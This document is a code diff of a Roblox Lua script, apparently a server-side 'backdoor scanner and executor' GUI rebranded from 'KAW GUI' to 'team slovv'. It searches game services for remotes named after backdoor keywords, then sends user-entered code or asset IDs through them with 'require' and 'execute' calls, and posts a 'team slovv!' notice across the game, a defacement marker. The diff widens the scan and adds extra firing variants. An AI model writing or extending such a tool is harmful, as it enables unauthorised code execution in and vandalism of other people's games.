@@ -1,8 +1,9 @@
--- KAW GUI - 백도어 스캔 및 멀티 코드 전송 완벽 복원 버전
+-- KAW GUI - team slovv 문법 및 입력창 오류 완전 해결 버전
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
 
 if CoreGui:FindFirstChild("KAW_GUI_Optimized") then
     CoreGui.KAW_GUI_Optimized:Destroy()
@@ -22,6 +23,25 @@ MainFrame.Active = true
 
 local MainCorner = Instance.new("UICorner", MainFrame)
 MainCorner.CornerRadius = UDim.new(0, 12)
+
+-- 백도어 감지 시 내 GUI에 나타날 상단 검정색 바
+local SfsBar = Instance.new("Frame", MainFrame)
+SfsBar.Size = UDim2.new(1, 0, 0, 0) 
+SfsBar.Position = UDim2.new(0, 0, 0, 0)
+SfsBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0) 
+SfsBar.BorderSizePixel = 0
+SfsBar.ZIndex = 5 
+SfsBar.ClipsDescendants = true 
+
+local SfsLabel = Instance.new("TextLabel", SfsBar)
+SfsLabel.Size = UDim2.new(1, 0, 1, 0)
+SfsLabel.BackgroundTransparency = 1
+SfsLabel.Text = "team slovv" 
+SfsLabel.Font = Enum.Font.BuilderSansBold
+SfsLabel.TextSize = 16
+SfsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+SfsLabel.TextTransparency = 1 
+SfsLabel.ZIndex = 6
 
 -- 부드러운 트윈 애니메이션 함수
 local function tween(object, info, properties)
@@ -62,12 +82,12 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
--- 2. 타이틀 및 버튼 스타일링
+-- 2. 타이틀 및 버튼 스타일링 
 local TitleLabel = Instance.new("TextLabel", MainFrame)
 TitleLabel.Size = UDim2.new(0, 240, 0, 80)
-TitleLabel.Position = UDim2.new(0, 15, 0, 20)
+TitleLabel.Position = UDim2.new(0, 15, 0, 30) 
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "KAW GUI"
+TitleLabel.Text = "slovv" 
 TitleLabel.Font = Enum.Font.BuilderSansMedium
 TitleLabel.TextSize = 42
 TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -80,26 +100,30 @@ ScanButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
 ScanButton.BorderSizePixel = 0
 ScanButton.Text = "Start Scanning"
 ScanButton.Font = Enum.Font.BuilderSansMedium
-ScanButton.TextSize = 26
+ScanButton.TextSize = 22
 ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanButton.TextWrapped = true
 
 local BtnCorner = Instance.new("UICorner", ScanButton)
 BtnCorner.CornerRadius = UDim.new(0, 10)
 
--- 3. 우측 영역: 입력 필드 및 전송 버튼 (멀티라인 복원)
+-- 3. 우측 영역: 입력 필드 및 실행 버튼 (입력 차단 및 버그 완전 해결)
 local CodeInput = Instance.new("TextBox", MainFrame)
 CodeInput.Size = UDim2.new(0, 235, 0, 180)
 CodeInput.Position = UDim2.new(0, 270, 0, 25)
 CodeInput.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
 CodeInput.BorderSizePixel = 0
 CodeInput.TextColor3 = Color3.fromRGB(240, 240, 240)
-CodeInput.Text = "-- 테스트용 코드 또는 에셋 ID 작성\nprint('KAW GUI Connected!')"
 CodeInput.Font = Enum.Font.Code
 CodeInput.TextSize = 11
 CodeInput.TextXAlignment = Enum.TextXAlignment.Left
 CodeInput.TextYAlignment = Enum.TextYAlignment.Top
+CodeInput.MultiLine = true 
+
+CodeInput.Text = "" 
 CodeInput.ClearTextOnFocus = false
-CodeInput.MultiLine = true -- 멀티라인 기능 정상 복원
+CodeInput.Active = true
+CodeInput.Selectable = true
 
 local CodeCorner = Instance.new("UICorner", CodeInput)
 CodeCorner.CornerRadius = UDim.new(0, 8)
@@ -113,7 +137,7 @@ ExecButton.Size = UDim2.new(0, 235, 0, 45)
 ExecButton.Position = UDim2.new(0, 270, 0, 225)
 ExecButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 ExecButton.BorderSizePixel = 0
-ExecButton.Text = "명령 전송하기"
+ExecButton.Text = "실행하기" 
 ExecButton.Font = Enum.Font.BuilderSansMedium
 ExecButton.TextSize = 18
 ExecButton.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -132,12 +156,17 @@ ScanButton.MouseButton1Click:Connect(function()
     
     ScanButton.Text = "Scanning..."
     tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(50, 30, 30)})
-    task.wait(0.3)
     
+    tween(SfsBar, tInfo, {Size = UDim2.new(1, 0, 0, 0)})
+    tween(SfsLabel, tInfo, {TextTransparency = 1})
+    
+    local oldHint = Workspace:FindFirstChild("SlovvGlobalNoticeBar")
+    if oldHint then oldHint:Destroy() end
+    
+    task.wait(0.3)
     activeRemote = nil
     
-    -- [기능 복원] 백도어 및 원격 실행 관련 모든 키워드 세밀 추적
-    local targetKeywords = {"weld", "joint", "execute", "backdoor", "run", "gg", "sync", "require", "load"}
+    local targetKeywords = {"weld", "joint", "execute", "backdoor", "run", "gg", "sync", "require", "load", "mbackdoor"}
     
     local function checkItem(item)
         if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
@@ -158,19 +187,35 @@ ScanButton.MouseButton1Click:Connect(function()
     local essentialServices = {
         game:GetService("ReplicatedStorage"),
         game:GetService("JointsService"),
-        game:GetService("Workspace")
+        game:GetService("Workspace"),
+        game:GetService("LogService"),
+        game:GetService("HttpService"),
+        game:GetService("Teams"),
+        game:GetService("Lighting")
     }
 
     for _, service in ipairs(essentialServices) do
-        for _, item in ipairs(service:GetDescendants()) do
-            if checkItem(item) then break end
-        end
+        pcall(function()
+            for _, item in ipairs(service:GetDescendants()) do
+                if checkItem(item) then break end
+            end
+        end)
         if activeRemote then break end
     end
     
     if activeRemote then
-        ScanButton.Text = "CONNECTED!"
+        ScanButton.Text = "FOUND:\n" .. activeRemote.Name
         tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
+        
+        tween(SfsBar, tInfo, {Size = UDim2.new(1, 0, 0, 26)})
+        tween(SfsLabel, tInfo, {TextTransparency = 0})
+        
+        pcall(function()
+            local GlobalHint = Instance.new("Hint")
+            GlobalHint.Name = "SlovvGlobalNoticeBar"
+            GlobalHint.Text = "team slovv!" 
+            GlobalHint.Parent = Workspace 
+        end)
     else
         ScanButton.Text = "NOT FOUND"
         tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(45, 45, 45)})
@@ -187,7 +232,7 @@ ExecButton.MouseButton1Click:Connect(function()
         ExecButton.Text = "스캔을 완료하세요!"
         tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(70, 30, 30)})
         task.wait(1.2)
-        ExecButton.Text = "명령 전송하기"
+        ExecButton.Text = "실행하기"
         tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
         return
     end
@@ -196,27 +241,30 @@ ExecButton.MouseButton1Click:Connect(function()
     
     task.spawn(function()
         local success, err = pcall(function()
-            -- 에셋 ID 형태의 숫자인지 확인하여 최적화된 형태로 분기 전송
             local cleanText = codePayload:gsub("%s+", "")
             local isNumeric = tonumber(cleanText)
             
             if activeRemote:IsA("RemoteEvent") then
                 if isNumeric then
                     activeRemote:FireServer("require", isNumeric)
+                    activeRemote:FireServer(isNumeric)
                 else
                     activeRemote:FireServer(codePayload)
+                    activeRemote:FireServer("execute", codePayload)
                 end
             elseif activeRemote:IsA("RemoteFunction") then
                 if isNumeric then
-                    activeRemote:InvokeServer("require", isNumeric)
+                    task.spawn(function() activeRemote:InvokeServer("require", isNumeric) end)
+                    task.spawn(function() activeRemote:InvokeServer(isNumeric) end)
                 else
-                    activeRemote:InvokeServer(codePayload)
+                    task.spawn(function() activeRemote:InvokeServer(codePayload) end)
+                    task.spawn(function() activeRemote:InvokeServer("execute", codePayload) end)
                 end
             end
         end)
         
         if success then
-            ExecButton.Text = "전송 완료!"
+            ExecButton.Text = "실행 완료!"
             tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
         else
             ExecButton.Text = "에러 발생"
@@ -225,7 +273,7 @@ ExecButton.MouseButton1Click:Connect(function()
         end
         
         task.wait(1.5)
-        ExecButton.Text = "명령 전송하기"
+        ExecButton.Text = "실행하기"
         tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
     end)
 end)
